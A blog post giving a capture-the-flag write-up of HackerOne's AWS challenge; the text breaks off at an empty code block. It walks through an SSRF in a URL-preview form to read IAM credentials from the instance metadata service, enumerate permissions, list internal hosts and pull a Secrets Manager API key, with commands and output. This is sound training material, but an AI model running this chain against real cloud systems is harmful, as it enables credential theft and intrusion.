<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="AWS Capture the Flag by HackerOne" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="On April 5th, HackerOne launched a new challenge on their Hacker101 website that aimed to put hackers’ cloud expertise to the test. Seeing that I had some time to spare from my university schedule, I decided to take a shot at it even though I had absolutely no experience deploying applications on AWS! :laughing:" /><meta property="og:description" content="On April 5th, HackerOne launched a new challenge on their Hacker101 website that aimed to put hackers’ cloud expertise to the test. Seeing that I had some time to spare from my university schedule, I decided to take a shot at it even though I had absolutely no experience deploying applications on AWS! :laughing:" /><link rel="canonical" href="https://rizemon.github.io/posts/awshackerone-ctf/" /><meta property="og:url" content="https://rizemon.github.io/posts/awshackerone-ctf/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-05-01T19:13:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="AWS Capture the Flag by HackerOne" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/awshackerone-ctf/"},"description":"On April 5th, HackerOne launched a new challenge on their Hacker101 website that aimed to put hackers’ cloud expertise to the test. Seeing that I had some time to spare from my university schedule, I decided to take a shot at it even though I had absolutely no experience deploying applications on AWS! :laughing:","url":"https://rizemon.github.io/posts/awshackerone-ctf/","@type":"BlogPosting","headline":"AWS Capture the Flag by HackerOne","dateModified":"2021-05-01T19:13:00+08:00","datePublished":"2021-05-01T19:13:00+08:00","@context":"https://schema.org"}</script><title>AWS Capture the Flag by HackerOne | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end">
<div class="profile-wrapper text-center">
<div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a>
</div>
<div class="site-title mt-3"> <a href="/">rizemon's blog</a>
</div>
<div class="site-subtitle font-italic">Cyber Security Enthusiast.</div>
</div>
<ul class="w-100">
<li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a>
</li>
<li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a>
</li>
<li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a>
</li>
<li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a>
</li>
<li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a>
</li>
</ul>
<div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href%20=%20'mailto:'%20+%20%5B'',''%5D.join('@')" aria-label="email" class="order-5"> <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6"> <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span>
</div>
</div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>AWS Capture the Flag by HackerOne</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div>
<i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel">Cancel</span>
</div></div><div id="main-wrapper">
<div id="main">
<div class="row">
<div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
<h1 data-toc-skip>AWS Capture the Flag by HackerOne</h1>
<div class="post-meta text-muted d-flex flex-column">
<div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, May 1, 2021, 7:13 PM +0800"> May 1, 2021 <i class="unloaded">2021-05-01T19:13:00+08:00</i> </span> by <span class="author"> rizemon </span>
</div>
<div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1880 words">10 min</span>
</div>
</div>
<div class="post-content">
<p>On April 5th, HackerOne launched a new challenge on their Hacker101 website that aimed to put hackers’ cloud expertise to the test. Seeing that I had some time to spare from my university schedule, I decided to take a shot at it even though I had absolutely <strong>no experience</strong> deploying applications on AWS! <img class="emoji" title=":laughing:" alt=":laughing:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png" height="20" width="20"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/awshackerone.jpg" alt="" height="414px" width="615px"></p>
<h1 id="setup">Setup</h1>
<p>Login to the Hacker101 website and you will see a challenge at the bottom called <code class="language-plaintext highlighter-rouge">AWS CTF</code> that is rated <code class="language-plaintext highlighter-rouge">Moderate</code> and is worth 26 points, which is equivalent to a private invitation on the HackerOne platform.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/awshackerone1.png" alt=""></p>
<p>Clicking on the <code class="language-plaintext highlighter-rouge">Go</code> button will initiate the spinning up of the challenge. A personal flag submission URL and target link will be generated for you.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/awshackerone2.png" alt=""></p>
<p>Clicking on your target link that is highlighted in blue will bring you to the page that you need to attack.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/awshackerone3.png" alt=""></p>
<h1 id="accessing-the-instance-metadata-service-at-169254169254">Accessing the instance metadata service at <code class="language-plaintext highlighter-rouge">169.254.169.254</code>
</h1>
<p>If you type in <code class="language-plaintext highlighter-rouge">https://www.google.com/</code> into the field and submit, it will fetch what seems to be the <code class="language-plaintext highlighter-rouge">HTML</code> source of the URL you specified and render it on the right in the <code class="language-plaintext highlighter-rouge">Preview</code> section.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/awshackerone4.png" alt=""></p>
<p>Since this was an AWS-based challenge, the first thing I tried was to fetch the instance metadata service, which is available at <code class="language-plaintext highlighter-rouge">http://169.254.169.254/</code>, and it worked!</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/awshackerone5.png" alt=""></p>
<h1 id="generating-temporary-credentials-1">Generating temporary credentials (1)</h1>
<p>The next step would be to list the roles that we can generate credentials for by fetching <code class="language-plaintext highlighter-rouge">http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/awshackerone6.png" alt=""></p>
<p>To generate temporary credentials for <code class="language-plaintext highlighter-rouge">SSRFChallengeOneRole</code>, we just append the name to our URL and fetch the updated link <code class="language-plaintext highlighter-rouge">http://169.254.169.254/latest/meta-data/iam/security-credentials/SSRFChallengeOneRole</code>.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/awshackerone7.png" alt=""></p>
<p>The output is a bit long but you should get <code class="language-plaintext highlighter-rouge">JSON</code> that looks like this:</p>
<div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td>
<td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"Code"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Success"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"LastUpdated"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-04-11T14:58:44Z"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AWS-HMAC"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"AccessKeyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;REDACTED&gt;"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"SecretAccessKey"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;REDACTED&gt;"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Token"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;REDACTED&gt;"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Expiration"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-04-11T21:18:41Z"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td>
</tr></tbody></table></code></div></div>
<h1 id="using-the-temporary-credentials-1">Using the temporary credentials (1)</h1>
<p>To make use of them, you can use the <code class="language-plaintext highlighter-rouge">aws</code> CLI tool. If you are on Linux like me, you can install it using the following commands:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="s2">"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip"</span> <span class="nt">-o</span> <span class="s2">"awscliv2.zip"</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
unzip awscliv2.zip <span class="o">&amp;&amp;</span> <span class="se">\</span>
<span class="nb">sudo</span> ./aws/install
</pre></td>
</tr></tbody></table></code></div></div>
<p>Configure the <code class="language-plaintext highlighter-rouge">aws</code> CLI by exporting certain variables while specifying the <code class="language-plaintext highlighter-rouge">AccessKeyId</code>, <code class="language-plaintext highlighter-rouge">SecretAccessKey</code> and <code class="language-plaintext highlighter-rouge">Token</code> values that you received earlier.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td>
<td class="rouge-code"><pre><span class="nb">export </span><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span>&lt;AccessKeyId&gt;
<span class="nb">export </span><span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span>&lt;SecretAccessKey&gt;
<span class="nb">export </span><span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span>&lt;Token&gt;
<span class="nb">export </span><span class="nv">AWS_DEFAULT_REGION</span><span class="o">=</span>us-west-2
</pre></td>
</tr></tbody></table></code></div></div>
<p>To verify that it works, we can use the following command and you will get something like this:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>aws sts get-caller-identity                                                 
<span class="o">{</span>
    <span class="s2">"UserId"</span>: <span class="s2">"AROASCLNOVA3WZBF4QMYW:i-04686b0f980508e8e"</span>,
    <span class="s2">"Account"</span>: <span class="s2">"142500341815"</span>,
    <span class="s2">"Arn"</span>: <span class="s2">"arn:aws:sts::142500341815:assumed-role/SSRFChallengeOneRole/i-04686b0f980508e8e"</span>
<span class="o">}</span>
</pre></td>
</tr></tbody></table></code></div></div>
<h1 id="enumerating-api-calls-1">Enumerating API calls (1)</h1>
<p>There are many features that AWS supports and it can be a pain to enumerate one by one. Therefore I used a tool called <a href="https://github.com/andresriancho/enumerate-iam"><code class="language-plaintext highlighter-rouge">enumerate-iam</code></a> to automate the enumeration.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>git clone https://github.com/andresriancho/enumerate-iam
<span class="nv">$ </span><span class="nb">cd </span>enumerate-iam
<span class="nv">$ </span><span class="nb">sudo </span>pip3 <span class="nb">install</span> <span class="nt">-r</span> requirements.txt
</pre></td>
</tr></tbody></table></code></div></div>
<p>Using the following command, we can get an idea on what permissions we have as the <code class="language-plaintext highlighter-rouge">SSRFChallengeOneRole</code> role.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>python3 enumerate-iam.py <span class="nt">--access-key</span> <span class="nv">$AWS_ACCESS_KEY_ID</span> <span class="nt">--secret-key</span> <span class="nv">$AWS_SECRET_ACCESS_KEY</span> <span class="nt">--session-token</span> <span class="nv">$AWS_SESSION_TOKEN</span>
2021-04-11 12:32:15,192 - 2268 - <span class="o">[</span>INFO] Starting permission enumeration <span class="k">for </span>access-key-id <span class="s2">"&lt;REDACTED&gt;"</span>
2021-04-11 12:32:17,401 - 2268 - <span class="o">[</span>INFO] <span class="nt">--</span> Account ARN : arn:aws:sts::142500341815:assumed-role/SSRFChallengeOneRole/i-04686b0f980508e8e
2021-04-11 12:32:17,401 - 2268 - <span class="o">[</span>INFO] <span class="nt">--</span> Account Id  : 142500341815
2021-04-11 12:32:17,402 - 2268 - <span class="o">[</span>INFO] <span class="nt">--</span> Account Path: assumed-role/SSRFChallengeOneRole/i-04686b0f980508e8e
2021-04-11 12:32:20,391 - 2268 - <span class="o">[</span>INFO] Attempting common-service describe / list brute force.
2021-04-11 12:32:27,420 - 2268 - <span class="o">[</span>INFO] <span class="nt">--</span> secretsmanager.list_secrets<span class="o">()</span> worked!
2021-04-11 12:32:35,048 - 2268 - <span class="o">[</span>INFO] <span class="nt">--</span> dynamodb.describe_endpoints<span class="o">()</span> worked!
2021-04-11 12:32:40,402 - 2268 - <span class="o">[</span>INFO] <span class="nt">--</span> sts.get_caller_identity<span class="o">()</span> worked!
2021-04-11 12:32:49,837 - 2268 - <span class="o">[</span>INFO] <span class="nt">--</span> ec2.describe_instances<span class="o">()</span> worked!
</pre></td>
</tr></tbody></table></code></div></div>
<h1 id="using-ec2describe_instances">Using <code class="language-plaintext highlighter-rouge">ec2.describe_instances()</code>
</h1>
<p>Using this API call, we are able to get a list of IP addresses of the machines in the network.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>aws ec2 describe-instances  | <span class="nb">grep </span>Private 
    <span class="s2">"PrivateDnsName"</span>: <span class="s2">"ip-10-0-0-55.us-west-2.compute.internal"</span>,
    <span class="s2">"PrivateIpAddress"</span>: <span class="s2">"10.0.0.55"</span>,
            <span class="s2">"PrivateIpAddress"</span>: <span class="s2">"10.0.0.55"</span>,
            <span class="s2">"PrivateIpAddresses"</span>: <span class="o">[</span>
                    <span class="s2">"PrivateIpAddress"</span>: <span class="s2">"10.0.0.55"</span>
    <span class="s2">"PrivateDnsName"</span>: <span class="s2">"ip-10-0-0-10.us-west-2.compute.internal"</span>,
    <span class="s2">"PrivateIpAddress"</span>: <span class="s2">"10.0.0.10"</span>,
            <span class="s2">"PrivateIpAddress"</span>: <span class="s2">"10.0.0.10"</span>,
            <span class="s2">"PrivateIpAddresses"</span>: <span class="o">[</span>
                    <span class="s2">"PrivateIpAddress"</span>: <span class="s2">"10.0.0.10"</span>
    <span class="s2">"PrivateDnsName"</span>: <span class="s2">"ip-10-0-0-12.us-west-2.compute.internal"</span>,
    <span class="s2">"PrivateIpAddress"</span>: <span class="s2">"10.0.0.12"</span>,
            <span class="s2">"PrivateIpAddress"</span>: <span class="s2">"10.0.0.12"</span>,
            <span class="s2">"PrivateIpAddresses"</span>: <span class="o">[</span>
                    <span class="s2">"PrivateIpAddress"</span>: <span class="s2">"10.0.0.12"</span>
    <span class="s2">"PrivateDnsName"</span>: <span class="s2">"ip-10-0-0-11.us-west-2.compute.internal"</span>,
    <span class="s2">"PrivateIpAddress"</span>: <span class="s2">"10.0.0.11"</span>,
            <span class="s2">"PrivateIpAddress"</span>: <span class="s2">"10.0.0.11"</span>,
            <span class="s2">"PrivateIpAddresses"</span>: <span class="o">[</span>
                    <span class="s2">"PrivateIpAddress"</span>: <span class="s2">"10.0.0.11"</span>
</pre></td>
</tr></tbody></table></code></div></div>
<h1 id="accessing-100055">Accessing <code class="language-plaintext highlighter-rouge">10.0.0.55</code>
</h1>
<p>Using the web page we started with, we can try to communicate with other machines in the network. I tried the 4 IP addresses and I noticed something about the output when I queried <code class="language-plaintext highlighter-rouge">http://10.0.0.55</code>.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/awshackerone8.png" alt=""></p>
<p>It seems that the endpoint that we were submitting to was <code class="language-plaintext highlighter-rouge">/check_webpage</code> that had an <code class="language-plaintext highlighter-rouge">addr</code> parameter. On closer inspection, the returned <code class="language-plaintext highlighter-rouge">JSON</code> response had a base64-encoded value in <code class="language-plaintext highlighter-rouge">page</code> and decoding it returns the following message:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo </span><span class="nv">TWlzc2luZyBhcGlfa2V5IHBhcmFtZXRlci4gU2VlIEFXUyBTZWNyZXRzTWFuYWdlci4</span><span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span> 
Missing api_key parameter. See AWS SecretsManager.
</pre></td>
</tr></tbody></table></code></div></div>
<p>If you refer back to the output of the <code class="language-plaintext highlighter-rouge">enumerate-iam</code> tool that we ran, it says that we could run the <code class="language-plaintext highlighter-rouge">secretsmanager.list_secrets()</code> API call. Lets see what it returns.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>aws secretsmanager list-secrets
<span class="o">{</span>
    <span class="s2">"SecretList"</span>: <span class="o">[</span>
        <span class="o">{</span>
            ...
            <span class="s2">"Name"</span>: <span class="s2">"h101_flag_secret_secondary"</span>,
            <span class="s2">"Description"</span>: <span class="s2">"The second of two secrets used in deriving H101 SSRF challenge flags."</span>,
            ...
        <span class="o">}</span>,
        <span class="o">{</span>
            ...
            <span class="s2">"Name"</span>: <span class="s2">"h101_flag_secret_main"</span>,
            <span class="s2">"Description"</span>: <span class="s2">"The first of two secrets used in deriving H101 SSRF challenge flags."</span>,
            ...
        <span class="o">}</span>,
        <span class="o">{</span>
            ...
            <span class="s2">"Name"</span>: <span class="s2">"web_service_health_api_key"</span>,
            <span class="s2">"Description"</span>: <span class="s2">"Used to interact with the Web Service Health Monitor"</span>,
            ...
        <span class="o">}</span>
    <span class="o">]</span>
<span class="o">}</span>
</pre></td>
</tr></tbody></table></code></div></div>
<p>The two <code class="language-plaintext highlighter-rouge">h101_flag_secret_*</code> secrets caught my eye instantly but I couldn’t make use of them so I moved on to the <code class="language-plaintext highlighter-rouge">web_service_health_api_key</code> secret, which is probably what the earlier message was referring to. To retrieve the actual secret, we can use the follow command:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>aws secretsmanager get-secret-value <span class="nt">--secret-id</span> web_service_health_api_key            
<span class="o">{</span>
    <span class="s2">"ARN"</span>: <span class="s2">"arn:aws:secretsmanager:us-west-2:142500341815:secret:web_service_health_api_key-u54cKi"</span>,
    <span class="s2">"Name"</span>: <span class="s2">"web_service_health_api_key"</span>,
    <span class="s2">"VersionId"</span>: <span class="s2">"a69ba9fd-684f-4587-b25f-1e8562c6d687"</span>,
    <span class="s2">"SecretString"</span>: <span class="s2">"hXjYspOr406dn93uKGmsCodNJg3c2oQM"</span>,
    <span class="s2">"VersionStages"</span>: <span class="o">[</span>
        <span class="s2">"AWSCURRENT"</span>
    <span class="o">]</span>,
    <span class="s2">"CreatedDate"</span>: <span class="s2">"2021-03-17T10:03:17.443000-04:00"</span>
<span class="o">}</span>
</pre></td>
</tr></tbody></table></code></div></div>
<p>Now lets see what happens when we specify the <code class="language-plaintext highlighter-rouge">?api_key=hXjYspOr406dn93uKGmsCodNJg3c2oQM</code> as part of our URL that we want to query.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/awshackerone9.png" alt=""></p>
<p>We managed to access the page! There didn’t seem much but if we manually decode the output returned, we see that there was an attempt to fetch another file at <code class="language-plaintext highlighter-rouge">/static/main.js</code> which is probably hosted on <code class="language-plaintext highlighter-rouge">http://10.0.0.55</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td>
